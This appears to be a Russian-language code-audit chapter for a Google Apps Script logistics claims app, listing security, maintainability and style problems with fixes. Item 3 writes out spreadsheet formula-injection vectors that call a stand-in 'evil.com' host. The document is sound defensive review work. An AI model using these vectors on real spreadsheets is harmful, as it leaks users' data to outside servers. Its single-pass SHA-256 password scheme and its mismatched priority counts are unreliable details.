# 08. Проблемы и решения

Список проблем по приоритету. Каждый пункт: что, почему опасно, как чинить.

## 🔴 Критические (security / data loss)

### 1. Хранение паролей в plaintext

**Что:** в листах `ADMIN`, `PRACOWNIK`, `OPIEKUN`, `PLANISCI`, `DYSPOZYTOR`, `EKSPORT`, `WERYFIKATOR`, `UZYTKOWNICY` пароли лежат прямо в столбце `Hasło`. Любой, у кого есть доступ к Google Sheets (а это вся команда MagTrans), видит все пароли. При компрометации диска админа — утечка всех паролей сразу.

**Где:** `findUserInSheet` (`Code.gs:947`), все `add*` функции.

**Почему опасно:**
- Регуляторика (RODO/GDPR) не допускает хранение паролей в plaintext.
- Многие пользователи переиспользуют пароли — утечка одного компрометирует другие сервисы.

**Решение:**

1. Хешировать пароли при создании и обновлении. GAS не имеет bcrypt, но имеет `Utilities.computeHmacSha256Signature` или `Utilities.computeDigest('SHA_256', ...)`:
   ```javascript
   function _hashPassword(password, salt) {
     const data = password + ':' + salt;
     const bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, data);
     return Utilities.base64Encode(bytes);
   }
   ```
2. Хранить `Hasło` = `<salt>$<hash>`. При логине — пересчитать.
3. Миграция: при следующем входе каждого пользователя — заменить plaintext на hash. До этого — поддерживать оба формата (если в столбце нет `$`, считать plaintext и сразу мигрировать).
4. **Лучше:** перейти на полную email-only аутентификацию (только 2FA код, без `Hasło`). Все логины и так проходят 2FA — пароль избыточен. Удаляет проблему целиком.

### 2. XSS в сообщениях об ошибках

**Что:** в `index.html` есть несколько мест, где сервер-ответ вставляется в `innerHTML` без escape:

| Строка | Содержимое |
|--------|-----------|
| ~4148 | `'…Błąd serwera: …</b><br>' + claims[0]._error + '</div>'` |
| ~4157 | `'…❌ Błąd arkusza:</b> ' + info.error + '</div>'` |
| ~4162 | `'…Przykład col B w arkuszu:</b> ' + info.sample[0].colB + '</div>'` |
| ~4176 | `'…⚠️ Błąd: ' + (err.message || JSON.stringify(err)) + …'` |

**Почему опасно:** если злоумышленник заставит сервер вернуть ответ с `<script>` (например через формула в Sheets, через имя авто, через IBAN), он выполнится в браузере админа.

**Решение:**

1. Везде применять `escHtml` (есть на строке 6835):
   ```javascript
   container.innerHTML = '...' + escHtml(claims[0]._error) + '...';
   ```
2. Лучше — обёртка `setHtmlSafe(el, ...parts)`, которая автоматически escape-ит.
3. Идеально — переписать на `el.textContent` или `el.append(...)` и не использовать `innerHTML` для динамики.

### 3. Formula injection в пользовательский ввод

**Что:** если пользователь введёт в `Komentarz`, `Uwagi`, `OpisAutoryzacji` строку, начинающуюся с `=`, `+`, `-`, `@`, Google Sheets интерпретирует её как формулу. Вектор: `=HYPERLINK("evil.com","Click")`, `=IMPORTDATA("evil.com")`.

**Почему опасно:** в Google Sheets такие формулы могут утечь данные на внешний сервер при открытии листа админом.

**Решение:**

В `_sanitizeForSheet(s)` (новой функции):
```javascript
function _sanitizeForSheet(s) {
  if (typeof s !== 'string') return s;
  return /^[=+\-@]/.test(s.trim()) ? "'" + s : s;
}
```

Применять перед каждой записью user-input в `setValues` / `appendRow`.

### 4. Email header injection

**Что:** `_sendThreadedEmail` и `MailApp.sendEmail` принимают `to`, `subject` напрямую. Если `subject` содержит `\n` или `\r`, можно добавить заголовки (BCC, From) и расколоть письмо.

**Где:** `_sendThreadedEmail` (`Code.gs:5788`), `sendAccountCreatedEmail`, и др.

**Решение:**
```javascript
function _sanitizeHeader(s) {
  return String(s).replace(/[\r\n]+/g, ' ').slice(0, 200);
}
```

Применять к `subject`, `to`, `cc` перед отправкой. Дополнительно валидировать формат email.

### 5. Слишком длинные функции

**Что:**

| Функция | Строки | Длина |
|---------|--------|-------|
| `updateClaimFull` | 5183 | 462 |
| `submitNewClaim` | 6118 | 291 |
| `updateVehicleDetails` | 1822 | 98 |
| `addCarrier` | 1356 | 83 |
| `calcKmGwarantPerMonth` | 862 | 79 |

**Почему опасно:** невозможно охватить взглядом, тестировать, рефакторить. Любое изменение = риск регрессии.

**Решение** (на примере `updateClaimFull`):

Разбить на:
- `_validateClaimUpdate(payload, oldClaim)` — валидация и коллизии.
- `_recalcClaim(payload)` — расчёты км / EUR / гарантии.
- `_persistClaimUpdate(rowIdx, newClaim)` — batch-write в WNIOSEK.
- `_applyDecisionEmails(oldClaim, newClaim, decision)` — рассылка.
- `_handleReklamacjaTransition(oldClaim, newClaim)` — состояния рекламации.

Каждая ≤ 80 строк, каждая тестируема изолированно. Сама `updateClaimFull` становится:

```javascript
function updateClaimFull(login, rowIdx, payload) {
  const caller = requireEmployee(login);
  const oldClaim = _getClaimByRow(rowIdx);
  _validateClaimUpdate(payload, oldClaim);
  const newClaim = _recalcClaim({ ...oldClaim, ...payload });
  _persistClaimUpdate(rowIdx, newClaim);
  _handleReklamacjaTransition(oldClaim, newClaim);
  _applyDecisionEmails(oldClaim, newClaim, payload.decision, caller);
  _writeAuditLog(caller, 'updateClaimFull', `WNIOSEK#${oldClaim.nrZgl}`, oldClaim, newClaim);
  return ok({ nrZgl: oldClaim.nrZgl });
}
```

### 6. Дублирование CRUD-функций carrier ↔ opiekun

**Что:** функции `addVehicle` / `addVehicleByOpiekun`, `updateNaczepa` / `updateNaczepaByOpiekun`, и т.д. — копипаст (~30 пар функций), отличаются только проверкой прав и audit log.

**Где:** `Code.gs:1635`, `3181`, `2387`, `3479`, `2068`, `3535`, `4395`, и т.д.

**Решение:**

Вынести общий impl, обёртки только проверяют права и пишут audit:

```javascript
function _addVehicleImpl(carrierLogin, payload, actor) {
  // вся логика добавления
}

function addVehicle(login, carrierLogin, payload) {
  const caller = requireEmployee(login);
  return _addVehicleImpl(carrierLogin, payload, caller);
}

function addVehicleByOpiekun(login, carrierLogin, payload) {
  const caller = _requireOpiekun(login);
  if (!_opiekunOwnsCarrier(caller.login, carrierLogin)) {
    throw new Error('Nie masz uprawnień do tego przewoźnika');
  }
  const res = _addVehicleImpl(carrierLogin, payload, caller);
  _writeAuditLog(caller, 'addVehicleByOpiekun', `AUTO#${payload.nrRej}`, null, payload);
  return res;
}
```

Сокращает код в ~2 раза, делает audit единообразным.

## 🟠 Серьёзные (поддерживаемость, надёжность)

### 7. N+1 запросы и производительность

**Что:** функции типа `getOpiekunFleet` (`Code.gs:2733`) дёргают `getDataRange().getValues()` для 5+ листов в одном вызове. Для каждого перевозчика снова сканируют AUTA, KIEROWCY, NACZEPY.

**Решение:**
1. Один проход по AUTA, группировать по `LoginPrzewoznika` в Map.
2. То же для KIEROWCY и NACZEPY.
3. Передавать `ss` (открытый Spreadsheet) аргументом — не открывать повторно.
4. Кешировать справочники (`getNaczepyTypyList`, `getDyspozytorList`, `getPlannerList`) в `CacheService` на 1 час.

### 8. Отсутствие пагинации

**Что:** `getAllClaims`, `getClaimsForCarrier`, `getDriversList` возвращают ВСЕ записи. Для листа в 10к строк это 30+ MB, и легко вылет в 6-минутный лимит GAS.

**Решение:**
- Параметры `offset`, `limit`.
- Серверная фильтрация по статусу/перевозчику (сейчас она на клиенте после загрузки всего).
- Индексирование частых запросов через ScriptProperties (мапа `nrRej → rowIdx`).

### 9. Отсутствие try/catch в критичных местах

**Что:** в `doGet` если любой `ensureXxxSheet` бросит — пользователь видит пустой экран без сообщения. В `viesLookup`/`whiteListCheckAccount` нет retry на временные сбои EU API.

**Решение:**
```javascript
function doGet(e) {
  try {
    // существующий код
  } catch (err) {
    Logger.log('doGet failed: ' + err);
    return HtmlService.createHtmlOutput(
      '<h2>Błąd inicjalizacji aplikacji</h2><p>Skontaktuj się z administratorem.</p>'
    );
  }
}
```

И ретрай-обёртка для UrlFetchApp:
```javascript
function _fetchWithRetry(url, opts, retries) {
  retries = retries || 3;
  for (let i = 0; i < retries; i++) {
    try {
      const r = UrlFetchApp.fetch(url, opts);
      if (r.getResponseCode() < 500) return r;
    } catch (e) {
      if (i === retries - 1) throw e;
      Utilities.sleep(1000 * Math.pow(2, i));
    }
  }
}
```

### 10. Магические индексы колонок

**Что:** `row[0]`, `row[18]`, `row[35]` повсюду. Если кто-то вставит колонку в середину — всё ломается тихо.

**Решение:** именованные константы (см. [07-modularization-plan.md](07-modularization-plan.md#именованные-индексы-колонок)).

### 11. Непоследовательный формат ответов

**Что:** в коде сосуществуют:
- `{ error: 'msg' }`
- `{ success: false, error: 'msg' }`
- `{ ok: false, error: 'msg' }`
- `throw new Error('msg')`
- сразу payload

Клиенту приходится проверять все варианты, что приводит к багам в `withFailureHandler`.

**Решение:**

Завести хелперы:
```javascript
function ok(data) { return { ok: true, data: data || null }; }
function err(message, code) { return { ok: false, error: message, code: code || 'INTERNAL' }; }
```

Все API-функции используют только `ok()`/`err()`. Клиент: `if (!resp.ok) showError(resp.error)`.

### 12. Хранение пароля и login в одной таблице

**Что:** все 8 листов аутентификации содержат `Login + Hasło` рядом. Любой просмотр одного листа = утечка credentials.

**Решение:** см. п.1 (хеширование) и переход на email-only.

### 13. Два листа OPIEKUN и OPIEKUNOWIE

**Что:** `OPIEKUN` (новый, 6 колонок) и `OPIEKUNOWIE` (legacy, 3 колонки) живут параллельно. `validateCaller` смотрит в `OPIEKUN`, а `sendInternalDecisionEmail` ищет email в `OPIEKUNOWIE`.

**Где:** `ensureOpiekunowieSheet` (`Code.gs:700`), `getOpiekunEmail` (`Code.gs:765`).

**Решение:**

1. Добавить колонку `Email` в `OPIEKUN` (если её там нет полноценно).
2. Переписать `getOpiekunEmail` на чтение из `OPIEKUN`.
3. Удалить ensureOpiekunowieSheet, оставить как read-only fallback на 1 релиз.
4. После одного успешного релиза — удалить `OPIEKUNOWIE` лист.

### 14. Hardcoded бизнес-параметры

**Что:** `CONFIG.STAWKA_EUR_ZA_KM = 0.5`, `CONFIG.KM_DZIENNIE = 540`, пороги авторизации, лимит дней до подачи (10), и т.п. вшиты в код.

**Решение:**

Создать лист `CONFIG_PARAMS` (или использовать `ScriptProperties`):

| Ключ | Значение | Описание |
|------|----------|----------|
| stawka_eur_default | 0.5 | EUR/km, fallback |
| km_dziennie_default | 540 | km/день, fallback |
| auth_threshold_low | 1000 | EUR — порог авторизации |
| auth_threshold_high | 5000 | EUR — порог авторизации админ |
| min_days_to_submit | 10 | дней — минимум для wniosku |
| login_code_ttl | 600 | сек — время жизни 2FA |
| login_max_attempts | 5 | попыток |

Функция `getParam(key)` с кешем.

### 15. Дублирование расчётов на клиенте и сервере

**Что:** `calcKmPerMonth` (client, `index.html:2675`) и `calcKmGwarantPerMonth` (server, `Code.gs:862`) — независимые реализации одной формулы. При расхождении: клиент показывает одно, бэк считает другое.

**Решение (краткосрочно):**

При live preview не считать на клиенте. Использовать `google.script.run.previewClaim(payload)` с дебаунсом 500мс. Один источник истины.

**Решение (долгосрочно):** клиент и сервер делят общий блок кода (HtmlService include) с расчётной функцией.

### 16. Отсутствие audit-логов вне opiekun-функций

**Что:** `_writeAuditLog` вызывается только в opiekun-функциях. Прямые admin-функции (`updateCarrier`, `deleteCarrierHard`) не логируют.

**Решение:** обернуть все mutating-функции admin в audit. Переход на «обёрточный» подход (см. п.6) делает это автоматическим.

## 🟡 Средние (UX, стиль, читаемость)

### 17. Inline `style=` в 1 375 местах

**Решение:** см. [07-modularization-plan.md](07-modularization-plan.md). Утилитарные классы `.p-2`, `.mt-1`, `.text-navy` или семантические `.btn-primary`. Постепенная замена.

### 18. Inline `onclick=` в 300+ местах

**Решение:** делегирование на корневой `<body>`:
```javascript
document.body.addEventListener('click', e => {
  const action = e.target.dataset.action;
  if (action && App.actions[action]) App.actions[action](e);
});
```

И в HTML: `data-action="login"` вместо `onclick="doLogin()"`.

### 19. Дублирование шаблонов (фильтры + таблица)

**Что:** ~600 строк копипаст блоков «search input + select filter + table» для каждой роли.

**Решение:** один шаблон-фрагмент `_filters_table.html`, рендерящийся через include с параметрами.

### 20. Антипаттерн dark mode на `!important`

**Что:** ~150 строк CSS вида `body.dark [style*="..."] { ... !important }` чтобы перебить inline-стили.

**Решение:** убрать inline-стили (см. п.17), и dark-тема становится 5 строками `body.dark { --navy: #fff; }`.

### 21. Смешение PL/EN в коде

**Что:** переменные то польские (`pojazd`, `nrRej`, `przewoznik`), то английские (`vehicle`, `payload`). Тяжелый онбординг новых разработчиков.

**Решение:** выбрать один (предлагаю английский для кода, польский только в строках UI). Постепенный rename.

### 22. Отсутствие i18n

**Что:** UI-строки разбросаны по HTML и JS. Перевод/изменение текста = поиск по 10к строк.

**Решение:**
```javascript
const I18N = {
  pl: {
    LOGIN_TITLE: 'Zaloguj się, aby kontynuować',
    SUBMIT_SUCCESS: 'Wniosek wysłany!',
    // ...
  }
};
const t = key => I18N.pl[key] || key;
```

В HTML: `data-i18n="LOGIN_TITLE"` + инициализация при загрузке.

### 23. Feature flag `CHAT_ENABLED` hardcoded

**Что:** `window.CHAT_ENABLED = true` в `index.html:2641`.

**Решение:** возвращать с сервера в `verifyLoginCode` payload (`features: { chat: true }`).

### 24. Логирование email-адресов в Logger

**Что:** `Logger.log('MAIL WERWNĘTRZNY — TO: ' + toList)` (`Code.gs:6350`) — email-адреса попадают в Apps Script Logs, доступные всей команде.

**Решение:** маскировать через `maskEmail` (уже есть на стр. 993).

### 25. Отсутствие unit-тестов

**Что:** для критических расчётов (`calcKmGwarantPerMonth`, `calcEasterGS`, `getEUBanDaysGS`) нет тестов. Любое изменение — лотерея.

**Решение:**

GAS Test Framework или ручной test runner:
```javascript
function _testCalcKm() {
  const r = calcKmGwarantPerMonth(new Date('2026-01-01'), new Date('2026-01-31'), 0);
  if (r.totalDays !== 21) throw new Error('Expected 21 working days, got ' + r.totalDays);
  if (Math.abs(r.kmGwarant - 11340) > 1) throw new Error('Expected ~11340 km, got ' + r.kmGwarant);
  Logger.log('OK');
}
```

Запускается вручную или через triggered-test после деплоя.

## 🟢 Низкоприоритетные

### 26. Нет JSDoc на публичных функциях
Затрудняет автокомплит и понимание контракта.

### 27. Magic numbers
600с (TTL), 5 попыток, 7 дней — разбросаны без объяснения.

### 28. Legacy функция `authenticateUser`
Помечена как deprecated, но всё ещё используется. Удалить после миграции вызовов.

### 29. Нет rate limiting
`submitNewClaim` можно вызвать 100 раз в минуту. Risk: спам, исчерпание quota Mail.

### 30. Нет CSP / X-Frame-Options
GAS HtmlService по умолчанию защищён, но проверить настройки.

## Сводная таблица приоритетов

| Приоритет | Кол-во | Время на исправление |
|-----------|--------|----------------------|
| 🔴 Критические | 6 | 5–7 дней |
| 🟠 Серьёзные | 10 | 10–14 дней |
| 🟡 Средние | 8 | 7–10 дней |
| 🟢 Низкие | 6 | 3–5 дней |
| **Итого** | **30** | **25–36 дней** |

## Рекомендуемый порядок

1. **Неделя 1:** п. 2 (XSS), п. 3 (formula injection), п. 4 (email injection), п. 11 (унифицированный формат ответов).
2. **Неделя 2:** п. 1 (хеши паролей или переход на email-only), п. 9 (try/catch + retry), п. 24 (маскировка логов).
3. **Неделя 3:** п. 10 (именованные индексы), п. 14 (внешние конфиги), п. 13 (один лист opiekun).
4. **Неделя 4–6:** рефакторинг по плану из [07-modularization-plan.md](07-modularization-plan.md): п. 5 (длинные функции), п. 6 (дубли), п. 7 (производительность), п. 17–22 (фронтенд).
5. **Параллельно:** п. 25 (тесты на расчёты), п. 26 (JSDoc).
